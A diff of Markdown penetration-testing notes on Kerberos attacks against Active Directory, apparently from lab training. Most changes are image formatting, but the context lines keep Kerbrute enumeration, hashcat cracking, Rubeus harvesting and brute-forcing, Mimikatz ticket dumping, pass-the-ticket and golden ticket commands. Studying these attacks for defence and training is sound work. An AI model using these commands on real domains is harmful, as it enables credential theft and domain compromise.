@@ -20,22 +20,14 @@
 
 ## Kerberos Authentication Overview
 
-* ![alt text](https://i.imgur.com/VRr2B6w.png)
+*
+
+    <figure><img src="https://i.imgur.com/VRr2B6w.png" alt=""><figcaption></figcaption></figure>
 
 ### Kerberos Tickets Overview
 
 * The most common type of ticket is a ticket-granting ticket these can come in various forms such as a .kirbi for Rubeus .ccache for Impacket.
 * The main ticket that you will see is a .kirbi ticket. A ticket is typically base64 encoded and can be used for various attacks.
-
-## Attack Privilege Requirements
-
-* Kerbrute Enumeration - No domain access required
-* Pass the Ticket - Access as a user to the domain required
-* Kerberoasting - Access as any user required
-* AS-REP Roasting - Access as any user required
-* Golden Ticket - Full domain compromise (domain admin) required
-* Silver Ticket - Service hash required
-* Skeleton Key - Full domain compromise (domain admin) required
 
 ## Enumeration with Kerbrute
 
@@ -65,7 +57,9 @@ kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_
 ```
 
 * This will brute force user accounts from a domain controller using a supplied wordlist
-* ![1](https://user-images.githubusercontent.com/75596877/130246484-1b4fdb60-eb89-441b-b0c7-c1b06277c074.png)
+*
+
+    <figure><img src="https://user-images.githubusercontent.com/75596877/130246484-1b4fdb60-eb89-441b-b0c7-c1b06277c074.png" alt=""><figcaption></figcaption></figure>
 
 #### Enumerate Users Metasploit
 
@@ -185,7 +179,7 @@ hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt --show
 Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
 ```
 
-* Value `0` = RC4_HMAC_MD5 (default)
+* Value `0` = RC4\_HMAC\_MD5 (default)
 * Value `24` = AES 128/256 only
 * Use the `/tgtdeleg` flag in Rubeus to force RC4 even for AES-enabled accounts (does **not** work on Server 2019 DCs)
 
@@ -261,7 +255,9 @@ hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
 Rubeus.exe harvest /interval:30
 ```
 
-* ![alt text](https://i.imgur.com/VCeyyn9.png)
+*
+
+    <figure><img src="https://i.imgur.com/VCeyyn9.png" alt=""><figcaption></figcaption></figure>
 
 ### Brute-Forcing and Password-Spraying with Rubeus
 
@@ -278,7 +274,9 @@ echo 10.10.121.111 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
 Rubeus.exe brute /password:Password1 /noticket
 ```
 
-* ![alt text](https://i.imgur.com/WN4zVo5.png)
+*
+
+    <figure><img src="https://i.imgur.com/WN4zVo5.png" alt=""><figcaption></figcaption></figure>
 * Be mindful of how you use this attack as it may lock you out of the network depending on the account lockout policies.
 
 ## Pass the Ticket with Mimikatz
@@ -290,7 +288,9 @@ Rubeus.exe brute /password:Password1 /noticket
 * You can dump the Kerberos Tickets from the LSASS memory just like you can dump hashes.
 * When you dump the tickets with mimikatz it will give us a .kirbi ticket which can be used to gain domain admin if a domain admin ticket is in the LSASS memory.
 * This attack is great for privilege escalation and lateral movement if there are unsecured domain service account tickets
-* ![alt text](https://i.imgur.com/V6SOlll.png)
+*
+
+    <figure><img src="https://i.imgur.com/V6SOlll.png" alt=""><figcaption></figcaption></figure>
 
 ### Prepare Mimikatz & Dump Tickets
 
@@ -319,7 +319,9 @@ sekurlsa::tickets /export
 kerberos::ptt <ticket>
 ```
 
-* ![alt text](https://i.imgur.com/DwXmm8Z.png)
+*
+
+    <figure><img src="https://i.imgur.com/DwXmm8Z.png" alt=""><figcaption></figcaption></figure>
 * Here were just verifying that we successfully impersonated the ticket by listing our cached tickets.
 
 ```
@@ -345,7 +347,9 @@ klist
 
 ### Dump the krbtgt hash
 
-* ![alt text](https://i.imgur.com/VOEsU4O.png)
+*
+
+    <figure><img src="https://i.imgur.com/VOEsU4O.png" alt=""><figcaption></figcaption></figure>
 
 ```
 mimikatz.exe
@@ -363,7 +367,9 @@ Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id
 ```
 
 * Simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.
-* ![alt text](https://i.imgur.com/rh06qDl.png)
+*
+
+    <figure><img src="https://i.imgur.com/rh06qDl.png" alt=""><figcaption></figcaption></figure>
 * This will open a new elevated command prompt with the given ticket in mimikatz.
 
 ```
